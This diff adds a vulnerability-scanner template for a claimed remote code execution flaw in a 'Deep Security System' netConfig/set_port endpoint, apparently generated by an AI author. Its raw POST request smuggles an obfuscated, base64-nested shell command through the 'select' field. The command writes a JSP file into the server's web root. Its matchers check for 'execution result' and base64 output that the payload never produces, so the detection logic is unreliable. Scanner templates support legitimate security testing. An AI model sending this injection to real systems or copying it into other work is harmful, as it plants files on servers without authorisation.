@@ -1,0 +1,37 @@
+id: deep-security-rce
+
+info:
+  name: Deep Security System RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for a Remote Code Execution (RCE) vulnerability in the Deep Security System's `netConfig/set_port` endpoint.
+  tags: rce,deep-security
+
+http:
+  - raw:
+      - |
+        POST /fort/system;login/netConfig/set_port HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        select=6379+-j+DROP%0A%62%61%73%68%20%2d%63%20%24%28%65%63%68%6f%20%5a%57%4e%6f%62%79%41%69%55%45%4e%57%64%6d%52%59%55%58%56%6b%4d%30%70%77%5a%45%64%56%62%30%6c%71%52%57%6c%4c%56%48%4e%73%55%47%63%39%50%53%49%67%66%47%4a%68%63%32%55%32%4e%43%41%74%5a%43%41%2b%49%43%39%31%63%33%49%76%62%47%39%6a%59%57%77%76%64%47%39%74%59%32%46%30%4c%33%64%6c%59%6d%46%77%63%48%4d%76%5a%6d%39%79%64%43%39%30%63%6e%56%7a%64%43%39%32%5a%58%4a%7a%61%57%39%75%4c%32%78%76%5a%79%35%71%63%33%41%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%20%2d%69%29%0a%65%78%69%74%3b%0Aecho&Unselect=22,443,9443
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "execution result"
+        part: body
+      - type: regex
+        regex:
+          - "[a-zA-Z0-9+/=]{20,}" # Base64 encoded command output
+        part: body
+
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "command output: ([a-zA-Z0-9+/=]{20,})" # Extract the command output if present.
